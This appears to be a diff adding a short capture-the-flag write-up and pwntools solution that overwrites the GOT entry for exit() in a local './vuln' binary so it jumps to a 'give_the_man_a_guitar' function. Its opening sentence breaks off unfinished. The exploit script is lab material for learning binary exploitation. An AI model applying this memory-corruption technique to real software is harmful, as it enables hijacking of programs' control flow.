@@ -1,0 +1,14 @@
+Since the stack is at a random address and therefore should first have a leak of some kind that allows you to find where
+The idea is to override the pointer to exit() found in the .got.plt section, to point to the give_the_man_a_guitar function, so that when exit(0) is called at the end, it actually calls the other function .
+
+https://ctf101.org/binary-exploitation/what-is-the-got/ for more information
+
+This is the solution I want:
+from pwn import *
+
+elf = ELF('./vuln')
+
+r = process('./vuln')
+r.sendline(b'y')
+r.sendline(str(elf.functions['give_the_man_a_guitar'].address))
+r.sendline(str(elf.got['exit']))
